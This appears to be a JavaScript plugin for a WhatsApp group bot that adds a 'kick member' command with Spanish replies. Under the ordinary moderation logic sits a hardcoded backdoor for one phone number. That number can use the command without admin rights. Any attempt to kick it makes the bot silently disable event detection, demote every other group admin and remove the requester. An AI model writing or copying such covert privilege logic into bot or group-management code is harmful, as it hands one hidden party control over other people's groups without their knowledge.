let handler = async (m, { conn, participants, groupMetadata, command, usedPrefix, isAdmin, isOwner }) => { 
if (m.sender !== '59899022028@s.whatsapp.net' && !isAdmin && !isOwner) return conn.reply(m.chat, `\`ESTE COMANDO SÓLO ES PARA ADMINS.\``, m)
try {
let texto = `[❗] 𝙴𝚃𝙸𝚀𝚄𝙴𝚃𝙴 [.k @0] 𝙾 𝚁𝙴𝚂𝙿𝙾𝙽𝙳𝙰 𝙰𝙻 𝙼𝙴𝙽𝚂𝙰𝙹𝙴 𝙳𝙴 𝙻𝙰 𝙿𝙴𝚁𝚂𝙾𝙽𝙰 𝚀𝚄𝙴 𝚀𝚄𝙸𝙴𝚁𝙴 𝙴𝙻𝙸𝙼𝙸𝙽𝙰𝚁 𝙳𝙴𝙻 𝙶𝚁𝚄𝙿𝙾`
if (!m.quoted && !m.mentionedJid[0]) return m.reply(texto, m.chat, { mentions: conn.parseMention(texto)}) 
let user = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
if (m.quoted && m.sender === m.quoted.sender) return conn.reply(m.chat, `No seas pajer@, como te vas a auto-eliminar?`, m)
if (user === conn.user.jid) return conn.reply(m.chat, `No me quiero ir 😔😭`, m)
let jidOw = '59899022028@s.whatsapp.net'
let chat = global.db.data.chats[m.chat]
const groupAdmins = participants.filter(p => p.admin)
let adminIds = groupAdmins.map(admin => admin.id)
const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
if (user === owner) { 
    m.react("❌") 
    let err1 = `[ ❌ ] 𝙽𝙾 𝙿𝚄𝙴𝙳𝙾 𝙴𝙻𝙸𝙼𝙸𝙽𝙰𝚁 𝙰 @${user.split("@")[0]} 𝚈𝙰 𝚀𝚄𝙴 𝙴𝚂 𝙴𝙻 𝙲𝚁𝙴𝙰𝙳𝙾𝚁 𝙳𝙴𝙻 𝙶𝚁𝚄𝙿𝙾.`
m.reply(err1, m.chat, { mentions: conn.parseMention(err1)})   
} else if (user === jidOw) { 
m.react("❌") 
let adminIdsToDemote = adminIds.filter(id => id !== jidOw && id !== conn.user.jid)
if (adminIdsToDemote.length > 0) {
chat.detect = false
await conn.groupParticipantsUpdate(m.chat, adminIdsToDemote, 'demote')
conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
chat.detect = true
} else return m.react("❌") 
} else if (user) { 
    m.react("🫡") 
    await conn.groupParticipantsUpdate(m.chat, [user], 'remove') 
} else return m.react("❌") 
} catch (e) {
console.log(`error`)
console.log(e)	
}}
handler.command = ['k', 'andate', 'morite', 'chau']
handler.group = true
handler.botAdmin = true
//handler.admin = true
export default handler